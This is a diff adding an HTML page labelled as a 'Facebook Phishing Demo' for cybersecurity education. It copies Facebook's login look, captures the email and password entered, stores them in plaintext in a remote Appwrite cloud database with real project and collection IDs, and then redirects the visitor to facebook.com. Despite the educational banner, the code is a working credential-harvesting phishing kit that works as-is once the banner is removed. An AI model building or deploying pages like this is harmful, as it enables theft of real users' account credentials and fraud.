@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Facebook Phishing Demo - Standalone</title>
+    <!-- AppWrite SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/appwrite@14.0.0"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .app-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            width: 360px;
+            max-width: 90vw;
+        }
+        
+        .header-section {
+            background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(24, 119, 242, 0.3);
+            color: white;
+            text-align: center;
+        }
+        
+        .header-section h2 {
+            margin: 0;
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+        
+        .header-section p {
+            margin: 5px 0 0 0;
+            font-size: 12px;
+            opacity: 0.9;
+            font-weight: 500;
+        }
+        
+        .security-banner {
+            background-color: #e3f2fd;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 2px solid #90caf9;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(24, 119, 242, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0); }
+        }
+        
+        .security-banner h3 {
+            margin: 0 0 5px 0;
+            color: #1565c0;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        
+        .security-banner p {
+            margin: 0;
+            font-size: 13px;
+            color: #1976d2;
+            line-height: 1.4;
+        }
+        
+        form div {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            text-align: left;
+            font-size: 12px;
+            color: #65676b;
+            font-weight: 600;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            box-sizing: border-box;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            outline: none;
+        }
+        
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s, transform 0.1s;
+            text-transform: uppercase;
+        }
+        
+        .login-button:hover {
+            background-color: #166fe5;
+            transform: translateY(-1px);
+        }
+        
+        .create-account-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s;
+            text-transform: uppercase;
+        }
+        
+        .create-account-button:hover {
+            background-color: #36a420;
+        }
+        
+        .separator {
+            margin-top: 15px;
+            border-top: 1px solid #dadde1;
+            padding-top: 15px;
+        }
+        
+        .links-container {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #7f7f7f;
+            text-align: center;
+        }
+        
+        .links-container a {
+            color: #1877f2;
+            text-decoration: none;
+            margin: 0 5px;
+            transition: color 0.2s;
+        }
+        
+        .links-container a:hover {
+            color: #166fe5;
+            text-decoration: underline;
+        }
+        
+        .footer-info {
+            margin-top: 10px;
+            border-top: 1px solid #dadde1;
+            padding-top: 10px;
+            font-size: 11px;
+            color: #7f7f7f;
+            text-align: center;
+        }
+        
+        .database-info {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #dee2e6;
+            margin-top: 15px;
+            text-align: left;
+            display: none;
+        }
+        
+        .database-info.show {
+            display: block;
+        }
+        
+        .database-info h4 {
+            margin: 0 0 10px 0;
+            color: #495057;
+        }
+        
+        .database-info p {
+            margin: 5px 0;
+            font-size: 12px;
+            color: #495057;
+            line-height: 1.6;
+        }
+        
+        .stats-box {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #e9ecef;
+            border-radius: 4px;
+        }
+        
+        .stats-box p {
+            margin: 3px 0;
+            font-weight: bold;
+        }
+        
+        .btn-group {
+            font-size: 11px;
+            opacity: 0.8;
+            display: flex;
+            gap: 5px;
+            margin-top: 5px;
+        }
+        
+        .btn-group button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            cursor: pointer;
+        }
+        
+        .btn-group button.secondary {
+            background-color: #65676b;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <div class="header-section">
+            <h2>Facebook</h2>
+            <p>Connect with friends and the world around you.</p>
+        </div>
+        
+        <div class="security-banner">
+            <h3>🛡️ CYBERSECURITY EDUCATION DEMO</h3>
+            <p>This page demonstrates how phishing attacks work. Never enter real credentials!</p>
+            <div class="btn-group">
+                <button id="viewDbBtn">View Database Info</button>
+                <button id="clearDbBtn" class="secondary">Clear Database</button>
+            </div>
+        </div>
+        
+        <form id="loginForm">
+            <div>
+                <label for="email">Email or phone number</label>
+                <input type="text" id="email" placeholder="Email or phone number" />
+            </div>
+            <div>
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Password" />
+            </div>
+            <div>
+                <button type="submit" class="login-button">Log In</button>
+            </div>
+        </form>
+        
+        <div class="separator">
+            <button class="create-account-button">Create New Account</button>
+        </div>
+        
+        <div id="databaseInfo" class="database-info">
+            <h4>🔒 Database Information (Educational)</h4>
+            <div>
+                <p><strong>What happens in real phishing:</strong></p>
+                <p>• Your credentials are immediately stored in a database</p>
+                <p>• Attackers can access this data from anywhere in the world</p>
+                <p>• Your personal information becomes part of a criminal database</p>
+                
+                <div class="stats-box">
+                    <p><strong>Current Database Stats:</strong></p>
+                    <p>• Total attempts: <span id="totalAttempts">0</span></p>
+                    <p>• Stored users: <span id="totalUsers">0</span></p>
+                    <p>• Database size: <span id="dbSize">0</span> bytes</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="links-container">
+            <a href="#" id="securityTip">How to spot phishing?</a>
+            <div style="margin-top: 10px;">
+                <span>English (US)</span>
+                <a href="#" style="margin-left: 10px;">Español</a>
+                <a href="#" style="margin-left: 10px;">Français (France)</a>
+            </div>
+            <div class="footer-info">
+                <span>🔒 Cybersecurity Education Project © 2025</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // AppWrite Database for educational cybersecurity demonstration
+        class AppwriteCybersecurityDatabase {
+            constructor() {
+                this.appwriteEndpoint = 'https://sgp.cloud.appwrite.io/v1';
+                this.projectId = '69b2a05d000ff1fe0013';
+                this.databaseId = '69b2a105003247b3a7e6';
+                this.collectionId = '69b2a11a00330015548e';
+                
+                this.client = new Appwrite.Client()
+                    .setEndpoint(this.appwriteEndpoint)
+                    .setProject(this.projectId);
+                
+                this.databases = new Appwrite.Databases(this.client);
+            }
+
+            initFallback() {
+                if (!localStorage.getItem('appwrite_cybersecurity_data')) {
+                    const initialData = {
+                        users: [],
+                        attempts: [],
+                        timestamp: new Date().toISOString()
+                    };
+                    localStorage.setItem('appwrite_cybersecurity_data', JSON.stringify(initialData));
+                }
+            }
+
+            async storeCredentials(email, password) {
+                const userRecord = {
+                    email: email,
+                    password: password
+                };
+
+                try {
+                    const response = await this.databases.createDocument(
+                        this.databaseId,
+                        this.collectionId,
+                        'unique()',
+                        userRecord
+                    );
+                    return { ...userRecord, id: response.$id };
+                } catch (error) {
+                    console.error('Failed to store in AppWrite database:', error);
+                    return this.storeCredentialsFallback(email, password, userRecord);
+                }
+            }
+
+            async getStatistics() {
+                try {
+                    const response = await this.databases.listDocuments(
+                        this.databaseId,
+                        this.collectionId
+                    );
+
+                    const documents = response.documents || [];
+                    const users = documents.filter(doc => doc.email && doc.password);
+                    const attempts = documents.filter(doc => doc.type === 'credential_attempt');
+
+                    return {
+                        totalAttempts: attempts.length,
+                        totalUsers: users.length,
+                        recentActivity: attempts.slice(-5).reverse(),
+                        databaseSize: JSON.stringify(documents).length
+                    };
+                } catch (error) {
+                    console.error('Failed to get statistics from AppWrite database:', error);
+                    return this.getStatisticsFallback();
+                }
+            }
+
+            storeCredentialsFallback(email, password, userRecord) {
+                const data = this.getLocalDatabase();
+                data.users.push(userRecord);
+                data.attempts.push({
+                    type: 'credential_attempt',
+                    email: email,
+                    timestamp: userRecord.timestamp,
+                    success: false
+                });
+                localStorage.setItem('appwrite_cybersecurity_data', JSON.stringify(data));
+                return userRecord;
+            }
+
+            getStatisticsFallback() {
+                const data = this.getLocalDatabase();
+                return {
+                    totalAttempts: data.attempts.length,
+                    totalUsers: data.users.length,
+                    recentActivity: data.attempts.slice(-5).reverse(),
+                    databaseSize: JSON.stringify(data).length
+                };
+            }
+
+            getLocalDatabase() {
+                const data = localStorage.getItem('appwrite_cybersecurity_data');
+                if (!data) {
+                    const initialData = { users: [], attempts: [] };
+                    localStorage.setItem('appwrite_cybersecurity_data', JSON.stringify(initialData));
+                    return initialData;
+                }
+                return JSON.parse(data);
+            }
+
+            async clearDatabase() {
+                try {
+                    const response = await this.databases.listDocuments(
+                        this.databaseId,
+                        this.collectionId
+                    );
+
+                    const deletePromises = response.documents.map(doc => 
+                        this.databases.deleteDocument(this.databaseId, this.collectionId, doc.$id)
+                    );
+
+                    await Promise.all(deletePromises);
+                } catch (error) {
+                    console.error('Failed to clear AppWrite database:', error);
+                    localStorage.removeItem('appwrite_cybersecurity_data');
+                }
+            }
+        }
+
+        // Initialize database
+        const appwriteDatabase = new AppwriteCybersecurityDatabase();
+        appwriteDatabase.initFallback();
+
+        // DOM Elements
+        const loginForm = document.getElementById('loginForm');
+        const viewDbBtn = document.getElementById('viewDbBtn');
+        const clearDbBtn = document.getElementById('clearDbBtn');
+        const databaseInfo = document.getElementById('databaseInfo');
+        const totalAttempts = document.getElementById('totalAttempts');
+        const totalUsers = document.getElementById('totalUsers');
+        const dbSize = document.getElementById('dbSize');
+        const securityTip = document.getElementById('securityTip');
+
+        // Event Listeners
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert("Please enter both email and password.");
+                return;
+            }
+
+            try {
+                await appwriteDatabase.storeCredentials(email, password);
+                window.location.href = 'https://www.facebook.com';
+            } catch (error) {
+                console.error('Database error:', error);
+                window.location.href = 'https://www.facebook.com';
+            }
+        });
+
+        viewDbBtn.addEventListener('click', async () => {
+            databaseInfo.classList.toggle('show');
+            if (databaseInfo.classList.contains('show')) {
+                await updateDatabaseStats();
+            }
+        });
+
+        clearDbBtn.addEventListener('click', async () => {
+            if (confirm("Clear all demonstration data? This will reset the educational database.")) {
+                try {
+                    await appwriteDatabase.clearDatabase();
+                    databaseInfo.classList.remove('show');
+                    alert("Database cleared for demonstration purposes.");
+                } catch (error) {
+                    console.error('Clear database error:', error);
+                    alert('Failed to clear database. Using fallback.');
+                }
+            }
+        });
+
+        securityTip.addEventListener('click', (e) => {
+            e.preventDefault();
+            alert("🔒 SECURITY TIP: Always check the URL before entering credentials!\n\nReal Facebook: https://www.facebook.com\n\nThis demo URL is different - that's how you can spot phishing!");
+        });
+
+        // Functions
+        async function updateDatabaseStats() {
+            try {
+                const stats = await appwriteDatabase.getStatistics();
+                totalAttempts.textContent = stats.totalAttempts;
+                totalUsers.textContent = stats.totalUsers;
+                dbSize.textContent = stats.databaseSize;
+            } catch (error) {
+                console.error('Get stats error:', error);
+                totalAttempts.textContent = '0';
+                totalUsers.textContent = '0';
+                dbSize.textContent = '0';
+            }
+        }
+
+        // Test AppWrite connection on load
+        appwriteDatabase.client.ping()
+            .then(() => {
+                console.log('✅ AppWrite connection successful!');
+            })
+            .catch((error) => {
+                console.error('❌ AppWrite connection failed:', error);
+                console.log('Using fallback localStorage database for demonstration.');
+            });
+    </script>
+</body>
+</html>
